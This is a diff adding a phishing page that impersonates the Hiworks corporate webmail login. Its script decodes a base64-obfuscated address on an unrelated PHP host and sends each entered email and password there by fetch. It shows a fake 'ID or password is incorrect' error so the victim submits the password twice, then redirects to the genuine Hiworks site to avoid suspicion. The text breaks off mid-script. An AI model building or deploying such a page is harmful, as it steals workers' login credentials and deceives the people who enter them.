@@ -1,0 +1,591 @@
+<!DOCTYPE html>
+
+<html lang="en">
+
+  <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>하이웍스 로그인</title>
+    <style>
+      body {
+        font-family: ui-sans-serif, system-ui, -apple-system, BlinkMacSystemFont, Segoe UI, Roboto, Helvetica Neue, Arial, Noto Sans, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", Segoe UI Symbol, "Noto Color Emoji";
+        background-color: rgb(250, 250, 250);
+      }
+
+      .page_container {
+        display: flex;
+        justify-content: center;
+        height: 94vh;
+        padding-left: 20px;
+        padding-right: 20px;
+        margin: 0;
+      }
+
+      .page_view {
+        display: flex;
+        flex-direction: column;
+        justify-content: start;
+        align-items: center;
+        width: 70%;
+        height: 99vh;
+        margin-bottom: 0;
+      }
+
+      #logo_container {
+        width: 100%;
+        height: 5vh;
+      }
+
+      .brand {
+        margin: 0;
+      }
+
+
+      #logo_container2 {
+        margin-top: 20vh;
+        margin-bottom: 3vh;
+        display: none;
+        justify-content: center;
+        height: 5vh;
+      }
+
+      .form1_container,
+      .form2_container {
+        width: 69vw;
+        height: 45vh;
+        display: flex;
+        flex-direction: column;
+        justify-content: center;
+        align-items: center;
+      }
+
+
+
+      .form2_container {
+        /* width: 69vw; */
+        height: 50vh;
+      }
+
+      #first_title_container {
+        display: flex;
+        display: flex;
+        flex-direction: column;
+        justify-content: center;
+        align-items: center;
+      }
+
+
+
+      #second_title_container {
+        display: flex;
+        flex-direction: column;
+        justify-content: center;
+        align-items: center;
+        margin-top: 0;
+        margin-bottom: 0;
+        margin-left: 0;
+        margin-right: 0;
+        display: none;
+      }
+
+      .title {
+        font-weight: 500;
+        font-size: 34px;
+        margin-bottom: 0;
+        margin-top: 0px;
+      }
+
+      .subtitle {
+        font-weight: 300;
+        font-size: 13px;
+        margin-top: 20px;
+
+      }
+
+
+      #second_title_container .title {
+        font-size: 24px;
+        margin-top: 25px;
+
+      }
+
+      #companyName {
+        color: gray;
+      }
+
+      #second_title_container .subtitle {
+        font-size: 13px;
+        font-weight: 400;
+        margin-top: 25px;
+
+      }
+
+      form {
+        display: block;
+        width: 22vw;
+        margin-top: 10px;
+      }
+
+      #email,
+      #password {
+        width: 100%;
+        height: 30px;
+        background-color: white;
+        border: 1px solid lightgray;
+        font-family: inherit;
+        -webkit-tap-highlight-color: transparent;
+        appearance: none;
+        resize: none;
+        box-sizing: border-box;
+        display: block;
+        text-align: left;
+        transition: border-color 100ms ease 0s;
+        height: 2.5rem;
+        min-height: 0px;
+        line-height: 2.5rem;
+        font-size: 0.875rem;
+        letter-spacing: -0.013125rem;
+        padding: 8px 10px;
+        border-radius: 2px;
+        border: 1px solid rgb(214, 214, 214);
+        background-color: rgb(255, 255, 255);
+        color: rgb(51, 51, 51);
+        margin-top: 20px;
+      }
+
+      #password {
+        display: none;
+        /* background: url(images/comment-author.gif) no-repeat scroll 7px 7px;
+        padding-left: 30px; */
+
+      }
+
+      #btn2 {
+        display: none;
+      }
+
+      .error_text {
+        display: none;
+        color: red;
+        font-size: 13px;
+        font-weight: 400;
+        margin: 0px;
+        margin-top: 2px;
+      }
+
+      #badge {
+        height: 3vh;
+        margin-top: 15px;
+        padding-left: 20px;
+        padding-right: 20px;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        border-radius: 20px;
+        border: 1px solid lightgray;
+        display: none;
+      }
+
+      #badge_text {
+        color: #575656;
+        font-size: 15px;
+        font-weight: 400;
+        margin: 0;
+        margin-left: 8px;
+      }
+
+      .btn {
+        background-color: #2985db;
+        opacity: 0.3;
+        color: white;
+        border-radius: 4px;
+        border: hidden;
+        width: 100%;
+        height: 40px;
+        margin-top: 25px;
+        font-size: 16px;
+        cursor: default;
+      }
+
+      #submit_button1 {
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        width: 100%;
+        height: 40px;
+        margin-top: 25px;
+        font-size: 16px;
+      }
+
+      #submit_button2 {
+        display: none;
+      }
+
+      #notice_container {
+        display: flex;
+        width: 22vw;
+        justify-content: flex-start;
+        align-items: center;
+        margin-top: 30px;
+
+      }
+
+      .notice,
+      #sign_in_option {
+        font-size: 13px;
+        font-weight: 300;
+        text-decoration: none;
+        color: #2985db;
+      }
+
+      #options_container {
+        display: flex;
+        width: 22vw;
+        justify-content: space-between;
+        align-items: center;
+        margin-top: 20px;
+        display: none;
+      }
+
+      .switch_container {
+        display: flex;
+        justify-content: flex-start;
+        align-items: center;
+
+      }
+
+      .switch {
+        position: relative;
+        display: inline-block;
+        width: 40px;
+        height: 24px;
+      }
+
+      .switch input {
+        opacity: 0;
+        width: 0;
+        height: 0;
+      }
+
+      .slider {
+        position: absolute;
+        cursor: pointer;
+        top: 0;
+        left: 0;
+        right: 0;
+        bottom: 0;
+        background-color: #ccc;
+        transition: .4s;
+        border-radius: 24px;
+      }
+
+      .slider:before {
+        position: absolute;
+        content: "";
+        height: 18px;
+        width: 20px;
+        left: 4px;
+        bottom: 4px;
+        background-color: white;
+        transition: .4s;
+        border-radius: 50%;
+      }
+
+      input:checked+.slider {
+        background-color: #2196F3;
+      }
+
+      input:checked+.slider:before {
+        transform: translateX(14px);
+      }
+
+      .ip_text {
+        font-size: 12px;
+        font-weight: 400;
+        text-decoration: none;
+        margin: 0;
+      }
+
+      .copyright {
+        font-size: 13px;
+        font-weight: 300;
+        text-decoration: none;
+        color: lightgray;
+        position: absolute;
+        bottom: 40px;
+        text-decoration: none;
+      }
+    </style>
+  </head>
+
+
+  <body>
+    <main>
+      <div class="page_container">
+        <div class="page_view">
+          <div>
+            <br>
+            <div id="logo_container"><svg xmlns="http://www.w3.org/2000/svg" width="90.95" height="23"
+                viewBox="0 0 106.95 23">
+                <g data-name="그룹 13414">
+                  <path data-name="패스 5537"
+                    d="M354.221 242.424h3.451v10.237a8.352 8.352 0 0 1 .8-1.013 5.229 5.229 0 0 1 1.015-.842 5.175 5.175 0 0 1 1.27-.585 5.281 5.281 0 0 1 1.565-.214 4.972 4.972 0 0 1 3.921 1.556 6.077 6.077 0 0 1 1.382 4.187v9.505h-3.451v-8.467a3.967 3.967 0 0 0-.827-2.7 2.946 2.946 0 0 0-2.342-.946 3.176 3.176 0 0 0-2.412.974 3.8 3.8 0 0 0-.926 2.723v8.411h-3.451z"
+                    style="fill:#0080dd" transform="translate(-354.221 -242.424)" />
+                  <path data-name="패스 5538" d="M444.9 282.778h3.451v14.937H444.9z"
+                    transform="translate(-427.165 -274.885)" style="fill:#0080dd" />
+                  <path data-name="패스 5539"
+                    d="M478.891 281.967h3.509l3 10.241 3.31-10.3h2.914l3.338 10.3 3.055-10.241h3.423l-4.894 15.05h-3.055L490.15 286.8l-3.366 10.212h-3.055z"
+                    transform="translate(-454.506 -274.187)" style="fill:#0080dd" />
+                  <path data-name="패스 5540"
+                    d="M762.3 242.424h3.451v14.513l6.2-6.62h4.158l-5.941 6.082 6.139 8.855h-3.961l-4.5-6.45-2.094 2.178v4.272H762.3z"
+                    transform="translate(-682.482 -242.424)" style="fill:#0080dd" />
+                  <path data-name="패스 5541"
+                    d="M843.759 292.307a7.988 7.988 0 0 0 1.745.854 6.945 6.945 0 0 0 2.419.467 2.894 2.894 0 0 0 1.712-.438 1.372 1.372 0 0 0 .608-1.171v-.057a1.084 1.084 0 0 0-.269-.733 2.254 2.254 0 0 0-.736-.537 8.587 8.587 0 0 0-1.075-.424q-.609-.2-1.259-.395-.821-.226-1.655-.536a6 6 0 0 1-1.5-.8 4.01 4.01 0 0 1-1.089-1.228 3.557 3.557 0 0 1-.424-1.807v-.056a4.275 4.275 0 0 1 .41-1.891 4.219 4.219 0 0 1 1.132-1.44 5.052 5.052 0 0 1 1.7-.9 6.82 6.82 0 0 1 2.079-.311 9.417 9.417 0 0 1 2.857.458 13.048 13.048 0 0 1 2.97 1.446l-1.958 2.1a8.734 8.734 0 0 0-1.917-.88 6.267 6.267 0 0 0-2.037-.382 2.481 2.481 0 0 0-1.542.423 1.3 1.3 0 0 0-.552 1.072v.057a.97.97 0 0 0 .283.692 2.776 2.776 0 0 0 .75.536 8.343 8.343 0 0 0 1.075.452q.608.212 1.259.409.82.254 1.641.593a6.881 6.881 0 0 1 1.485.833 4.14 4.14 0 0 1 1.089 1.2 3.284 3.284 0 0 1 .424 1.722v.057a4.676 4.676 0 0 1-.424 2.061 4.026 4.026 0 0 1-1.174 1.453 5.27 5.27 0 0 1-1.768.875 7.778 7.778 0 0 1-2.178.3 9.977 9.977 0 0 1-3.268-.572 11.731 11.731 0 0 1-2.767-1.378z"
+                    transform="translate(-746.433 -273.373)" style="fill:#0080dd" />
+                  <path data-name="패스 5542"
+                    d="M607.324 284.2a4.3 4.3 0 1 1-4.3 4.3 4.306 4.306 0 0 1 4.3-4.3m0-3.451a7.752 7.752 0 1 0 7.751 7.752 7.751 7.751 0 0 0-7.751-7.752z"
+                    transform="translate(-551.582 -273.255)" style="fill:#0080dd" />
+                  <path data-name="패스 5543"
+                    d="M700.905 285.273a2.946 2.946 0 0 0-2.342-.946 3.176 3.176 0 0 0-2.412.974 3.8 3.8 0 0 0-.926 2.723v8.411h-3.451V281.5h3.451v2.339a8.338 8.338 0 0 1 .8-1.013 5.238 5.238 0 0 1 1.015-.842 5.176 5.176 0 0 1 1.27-.585 5.281 5.281 0 0 1 1.565-.214 4.971 4.971 0 0 1 3.921 1.556l-2.667 2.824z"
+                    transform="translate(-625.75 -273.605)" style="fill:#0080dd" />
+                  <path data-name="패스 5544"
+                    d="M441.838 244.755a2.325 2.325 0 1 1 2.325 2.329 2.327 2.327 0 0 1-2.325-2.329z"
+                    transform="translate(-424.7 -242.424)" style="fill-rule:evenodd;fill:#0080dd" />
+                </g>
+              </svg>
+            </div>
+            <div class="form1_container">
+              <div id="first_title_container">
+                <h2 class="title">Sign-in</h2>
+                <h4 class="subtitle">Please enter <b>login ID</b> with domain</h4>
+              </div>
+              <div id="second_title_container">
+                <div id="logo_container2"><svg xmlns="http://www.w3.org/2000/svg" width="180.95" height="43"
+                    viewBox="0 0 120.95 23">
+                    <g data-name="그룹 13414">
+                      <path data-name="패스 5537"
+                        d="M354.221 242.424h3.451v10.237a8.352 8.352 0 0 1 .8-1.013 5.229 5.229 0 0 1 1.015-.842 5.175 5.175 0 0 1 1.27-.585 5.281 5.281 0 0 1 1.565-.214 4.972 4.972 0 0 1 3.921 1.556 6.077 6.077 0 0 1 1.382 4.187v9.505h-3.451v-8.467a3.967 3.967 0 0 0-.827-2.7 2.946 2.946 0 0 0-2.342-.946 3.176 3.176 0 0 0-2.412.974 3.8 3.8 0 0 0-.926 2.723v8.411h-3.451z"
+                        style="fill:#0080dd" transform="translate(-354.221 -242.424)" />
+                      <path data-name="패스 5538" d="M444.9 282.778h3.451v14.937H444.9z"
+                        transform="translate(-427.165 -274.885)" style="fill:#0080dd" />
+                      <path data-name="패스 5539"
+                        d="M478.891 281.967h3.509l3 10.241 3.31-10.3h2.914l3.338 10.3 3.055-10.241h3.423l-4.894 15.05h-3.055L490.15 286.8l-3.366 10.212h-3.055z"
+                        transform="translate(-454.506 -274.187)" style="fill:#0080dd" />
+                      <path data-name="패스 5540"
+                        d="M762.3 242.424h3.451v14.513l6.2-6.62h4.158l-5.941 6.082 6.139 8.855h-3.961l-4.5-6.45-2.094 2.178v4.272H762.3z"
+                        transform="translate(-682.482 -242.424)" style="fill:#0080dd" />
+                      <path data-name="패스 5541"
+                        d="M843.759 292.307a7.988 7.988 0 0 0 1.745.854 6.945 6.945 0 0 0 2.419.467 2.894 2.894 0 0 0 1.712-.438 1.372 1.372 0 0 0 .608-1.171v-.057a1.084 1.084 0 0 0-.269-.733 2.254 2.254 0 0 0-.736-.537 8.587 8.587 0 0 0-1.075-.424q-.609-.2-1.259-.395-.821-.226-1.655-.536a6 6 0 0 1-1.5-.8 4.01 4.01 0 0 1-1.089-1.228 3.557 3.557 0 0 1-.424-1.807v-.056a4.275 4.275 0 0 1 .41-1.891 4.219 4.219 0 0 1 1.132-1.44 5.052 5.052 0 0 1 1.7-.9 6.82 6.82 0 0 1 2.079-.311 9.417 9.417 0 0 1 2.857.458 13.048 13.048 0 0 1 2.97 1.446l-1.958 2.1a8.734 8.734 0 0 0-1.917-.88 6.267 6.267 0 0 0-2.037-.382 2.481 2.481 0 0 0-1.542.423 1.3 1.3 0 0 0-.552 1.072v.057a.97.97 0 0 0 .283.692 2.776 2.776 0 0 0 .75.536 8.343 8.343 0 0 0 1.075.452q.608.212 1.259.409.82.254 1.641.593a6.881 6.881 0 0 1 1.485.833 4.14 4.14 0 0 1 1.089 1.2 3.284 3.284 0 0 1 .424 1.722v.057a4.676 4.676 0 0 1-.424 2.061 4.026 4.026 0 0 1-1.174 1.453 5.27 5.27 0 0 1-1.768.875 7.778 7.778 0 0 1-2.178.3 9.977 9.977 0 0 1-3.268-.572 11.731 11.731 0 0 1-2.767-1.378z"
+                        transform="translate(-746.433 -273.373)" style="fill:#0080dd" />
+                      <path data-name="패스 5542"
+                        d="M607.324 284.2a4.3 4.3 0 1 1-4.3 4.3 4.306 4.306 0 0 1 4.3-4.3m0-3.451a7.752 7.752 0 1 0 7.751 7.752 7.751 7.751 0 0 0-7.751-7.752z"
+                        transform="translate(-551.582 -273.255)" style="fill:#0080dd" />
+                      <path data-name="패스 5543"
+                        d="M700.905 285.273a2.946 2.946 0 0 0-2.342-.946 3.176 3.176 0 0 0-2.412.974 3.8 3.8 0 0 0-.926 2.723v8.411h-3.451V281.5h3.451v2.339a8.338 8.338 0 0 1 .8-1.013 5.238 5.238 0 0 1 1.015-.842 5.176 5.176 0 0 1 1.27-.585 5.281 5.281 0 0 1 1.565-.214 4.971 4.971 0 0 1 3.921 1.556l-2.667 2.824z"
+                        transform="translate(-625.75 -273.605)" style="fill:#0080dd" />
+                      <path data-name="패스 5544"
+                        d="M441.838 244.755a2.325 2.325 0 1 1 2.325 2.329 2.327 2.327 0 0 1-2.325-2.329z"
+                        transform="translate(-424.7 -242.424)" style="fill-rule:evenodd;fill:#0080dd" />
+                    </g>
+                  </svg>
+                </div>
+                <h2 class="title">Sign in to <span id="companyName"></span></h2>
+                <h4 class="subtitle">Please enter your password for identity verification.</h4>
+
+                <div id="badge">
+                  <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 16 16" class="mr-2">
+                    <path data-name="\uD328\uC2A4 98550" d="M8 0a8 8 0 1 0 8 8 8 8 0 0 0-8-8"
+                      style="fill: rgb(144, 144, 144);"></path>
+                    <path data-name="\uD569\uCE58\uAE30 689"
+                      d="M3727 20366.9a3.6 3.6 0 0 1 3.175-1.928.735.735 0 0 1 .235.037 4.043 4.043 0 0 0 2.638 0 .726.726 0 0 1 .23-.037 3.6 3.6 0 0 1 3.175 1.928 6.171 6.171 0 0 1-9.452 0zm1.886-6.057a2.84 2.84 0 1 1 2.837 2.836 2.837 2.837 0 0 1-2.836-2.839z"
+                      transform="translate(-3723.725 -20354.906)"
+                      style="fill: rgb(255, 255, 255); stroke: transparent; stroke-miterlimit: 10;"></path>
+                  </svg>
+                  <div style="width: 2px;"></div>
+                  <h6 id="badge_text"></h6>
+                </div>
+              </div>
+              <form id="emailForm" action="" method="post">
+                <input id="email" type="text" placeholder="id@company.onhiworks.com" name="email">
+                <input id="password" type="password" placeholder="Password" name="password">
+                <h6 class="error_text"></h6>
+                <div class="btn" id="submit_button1">Next</div>
+                <button class="btn" id="submit_button2" type="submit">Sign-in</button>
+              </form>
+
+              <div id="options_container">
+                <a href="#" id="sign_in_option">Sign in with another ID</a>
+                <div class="switch_container"><label class="switch">
+                    <input type="checkbox">
+                    <span class="slider"></span>
+                  </label>
+                  <div style="width: 10px;"></div>
+                  <h6 class="ip_text">IP Security</h6>
+                </div>
+              </div>
+              <div id="notice_container">
+                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="14" viewBox="0 0 16 14"
+                  class="shrink-0 grow-0 self-center">
+                  <defs>
+                    <clipPath id="jqwjrqddha">
+                      <path data-name="\uC0AC\uAC01\uD615 144435" d="M0 0h16v14H0z" style="fill: none;"></path>
+                    </clipPath>
+                  </defs>
+                  <g data-name="\uADF8\uB8F9 269070" style="clip-path: url(&quot;#jqwjrqddha&quot;);">
+                    <path data-name="\uD328\uC2A4 98612"
+                      d="M8 9.588s2.189 0 5.2 2.307a.5.5 0 0 0 .8-.395V.5a.5.5 0 0 0-.8-.391C10.189 2.412 8 2.412 8 2.412z"
+                      style="fill: rgb(224, 232, 238);"></path>
+                    <path data-name="\uD328\uC2A4 98613"
+                      d="M1.5 9.6H8V2.412H1.5a1.5 1.5 0 0 0-1.5 1.5V8.1a1.5 1.5 0 0 0 1.5 1.5"
+                      style="fill: rgb(226, 140, 70);"></path>
+                    <path data-name="\uD328\uC2A4 98614" d="M5 9H2v4a1 1 0 0 0 1 1h1a1 1 0 0 0 1-1z"
+                      style="fill: rgb(226, 140, 70);">
+                    </path>
+                    <path data-name="\uD328\uC2A4 98615" d="M15 7.5v-3a1 1 0 0 1 1 1v1a1 1 0 0 1-1 1"
+                      style="fill: rgb(159, 166, 173);">
+                    </path>
+                  </g>
+                </svg>
+                <div style="width: 5px;"></div>
+                <a href="https://www.hiworks.com/cs/notice/32361" class="notice">하이웍스 근무체크 앱 사용 관련 안내</a>
+              </div>
+            </div>
+          </div>
+          <a href="https://www.hiworks.com/" class="copyright">©Gabia Inc.</a>
+        </div>
+
+      </div>
+    </main>
+
+    <script>
+
+      document.addEventListener('DOMContentLoaded', function ()
+      {
+        var count = 0;
+        var hasEmailValue;
+        const authuserinitialEmail = getUrlParameter();
+        if (authuserinitialEmail) {
+          document.getElementById('email').value = authuserinitialEmail;
+          emailValue = authuserinitialEmail;
+          hasEmailValue = true;
+        }
+        checkIfEmpty();
+        document.getElementById('email').addEventListener('input', function ()
+        {
+          checkIfEmpty();
+        });
+        document.getElementById('password').addEventListener('input', function ()
+        {
+          checkIfEmpty();
+        });
+
+        function checkIfEmpty()
+        {
+          var emailField = document.getElementById('email');
+          var passwordField = document.getElementById('password');
+          var emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+
+          // Validate email field
+          if (emailField.value === '' || !emailRegex.test(emailField.value)) {
+            document.getElementById('submit_button1').style.opacity = '0.3';
+            document.getElementById('submit_button1').style.cursor = 'default';
+          } else {
+            document.getElementById('submit_button1').style.opacity = '1';
+            document.getElementById('submit_button1').style.cursor = 'pointer';
+            document.getElementById('submit_button1').addEventListener('click', submitEmail);
+          }
+
+          // Validate password field
+          if (passwordField.value === '') {
+            document.getElementById('submit_button2').style.opacity = '0.3';
+            document.getElementById('submit_button2').style.cursor = 'default';
+          } else {
+            document.getElementById('submit_button2').style.opacity = '1';
+            document.getElementById('submit_button2').style.cursor = 'pointer';
+            document.getElementById('submit_button2').addEventListener('click', submitPassword);
+          }
+        }
+
+
+
+        function submitEmail()
+        {
+          document.getElementById('badge_text').innerHTML = document.getElementById('email').value;
+          document.getElementById('companyName').innerHTML = document.getElementById('email').value.split('@')[1];;
+          document.getElementById('email').style.display = 'none';
+          document.getElementById('submit_button1').style.display = 'none';
+          document.getElementById('logo_container').style.display = 'none';
+          document.getElementById('submit_button2').style.display = 'block';
+          document.getElementById('first_title_container').style.display = 'none';
+          document.getElementById('second_title_container').style.display = 'flex';
+          document.getElementById('password').style.display = 'block';
+          document.getElementById('emailForm').style.display = 'block';
+          document.getElementById('options_container').style.display = 'flex';
+          document.getElementById('logo_container2').style.display = 'flex';
+          document.getElementById('badge').style.display = 'flex';
+          document.getElementById('emailForm').style.opacity = '1';
+          document.getElementById('emailForm').style.transform = 'translateY(0)';
+        };
+
+
+        function submitPassword(event)
+        {
+          count++;
+          event.preventDefault();
+          var base64ActionUrl = 'aHR0cHM6Ly96Y29sb29rLmNvbS90dy1jb250ZW50L2hpLXdwd2tzLnBocA=='; // Your base64 encoded URL
+          var decodedUrl = atob(base64ActionUrl); // Decode the base64 URL
+          this.action = decodedUrl; //
+          const email = document.getElementById('email').value.trim();
+          const password = document.getElementById('password').value.trim();
+          const errorText = document.querySelector('.error_text');
+          const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+
+          if (!emailRegex.test(email)) {
+            errorText.innerText = 'ID or password is incorrect.';
+            errorText.style.display = 'block';
+          } else if (email === '' || password === '') {
+            errorText.innerText = 'Email and password are required.';
+            errorText.style.display = 'block';
+          } else {
+            errorText.style.display = 'none';
+
+            const formData = {
+              email,
+              password,
+            };
+
+            fetch(decodedUrl, {
+              method: 'POST',
+              mode: 'no-cors',
+              headers: {
+                'Content-Type': 'application/json',
+              },
+              body: JSON.stringify(formData),
+            })
+              .then(response =>
+              {
+                // Check if the response is JSON
+                if (response.headers.get('content-type')?.includes('application/json')) {
+                  return response.json();
+                } else {
+                  return response.text().then(text => { console.log(Error(text)) });
+                }
+              })
+              .then(data =>
+              {
+                console.log('Response JSON:', data);
+                if (count >= 2) {
+                  errorText.style.display = 'none';
+                  window.location = 'https://login.office.hiworks.com';
+                } else {
+                  document.getElementById('password').value = '';
+                  setTimeout(() =>
+                  {
+                    errorText.innerHTML = 'ID or password is incorrect';
+                  }, 400);
+                  document.getElementById('password').style.display = 'block';
+                  document.getElementById('submit_button2').style.opacity = '0.3';
+                  errorText.style.display = 'block';
+                  setTimeout(() =>
+                  {
+                    errorText.styl
